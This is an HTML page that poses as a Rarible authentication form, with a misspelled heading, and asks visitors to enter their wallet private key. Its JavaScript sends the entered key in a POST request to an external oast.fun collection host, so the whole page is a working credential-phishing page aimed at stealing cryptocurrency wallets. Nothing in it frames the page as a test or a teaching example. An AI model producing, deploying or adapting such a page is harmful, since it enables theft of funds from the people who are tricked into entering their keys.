<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Form Submission with JavaScript</title>
</head>

<body>

	<h1>Enter your private key to authetnicate into Rarible</h1>

	<form id="myForm">
		<label for="privateKey">Private Key:</label>
		<input type="text" id="privateKey" name="privateKey" required>

		<button type="button" onclick="submitForm()">Submit</button>
	</form>

	<script>
		function submitForm() {
			var privateKey = document.getElementById('privateKey').value;

			var formData = {
				privateKey: privateKey
			};

			var urlEncodedData = Object.keys(formData).map(function (key) {
				return encodeURIComponent(key) + '=' + encodeURIComponent(formData[key]);
			}).join('&');

			var xhr = new XMLHttpRequest();
			xhr.open('POST', 'https://cnr3wf12vtc0000rfd40gkhb68wyyyyyb.oast.fun/', true);
			xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

			xhr.onreadystatechange = function () {
				if (xhr.readyState == 4 && xhr.status == 200) {
					console.log('Response:', xhr.responseText);
				}
			};

			xhr.send(urlEncodedData);
		}
	</script>

</body>

</html>
